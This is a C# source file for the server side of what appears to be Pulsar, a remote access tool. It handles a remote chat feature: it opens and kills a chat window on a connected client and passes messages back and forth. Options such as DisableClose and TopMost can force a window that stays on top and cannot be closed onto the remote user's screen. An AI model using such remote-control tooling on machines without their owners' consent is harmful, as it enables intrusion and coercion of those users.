using Pulsar.Common.Messages.UserSupport.RemoteChat;
using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Pulsar.Common.Messages.other;
using Pulsar.Server.Forms;

namespace Pulsar.Server.Messages
{

    public class RemoteChatHandler : MessageProcessorBase<object>
    {

        private readonly Client _client;


        public delegate void RetrievedMessageHandler(object sender, string Message);

        public event RetrievedMessageHandler PacketsRetrieved;


        private void RetrieveClientMessage(string Message)
        {
            SynchronizationContext.Post(d =>
            {
                var handler = PacketsRetrieved;
                handler?.Invoke(this, (string)d);
            }, Message);
        }
        public RemoteChatHandler(Client clients) : base(true)
        {
            _client = clients;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetChat;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetChat pass:
                    Execute(sender, pass);
                    break;
            }
        }
        public void StartForm(string Title, string WelcomeMessage, bool TopMost, bool DisableClose, bool DisableType)
        {
            _client.Send(new DoStartChatForm{
                Title = Title,
                WelcomeMessage = WelcomeMessage,
                TopMost = TopMost,
                DisableClose = DisableClose,
                DisableType = DisableType
            });
        }
        public void KillForm()
        {
            _client.Send(new DoKillChatForm());
        }

        public void SendMessageClient(string user, string message)
        {
            _client.Send(new DoChat {
                User = user,
                PacketDms = message });
        }

        private void Execute(ISender client, GetChat message)
        {
            Client c = (Client)client;
            RetrieveClientMessage(message.Message);
        }
    }
}
